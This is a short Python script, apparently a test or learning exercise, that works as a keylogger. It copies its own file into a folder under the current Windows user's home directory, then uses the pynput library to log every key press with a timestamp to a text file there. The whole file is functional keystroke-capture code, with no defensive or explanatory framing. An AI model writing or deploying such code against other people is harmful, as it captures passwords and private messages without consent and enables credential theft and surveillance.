import os
import logging
from shutil import copyfile
from pynput.keyboard import Listener

username=os.getlogin()
# print(username)
logging_directory=f"C:/Users/{username}/KeyLogTest"


copyfile('main.py',f'C:/Users/{username}/KeyLogTest/main.py')

logging.basicConfig(filename=f"{logging_directory}/mylog.txt",level=logging.DEBUG,format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()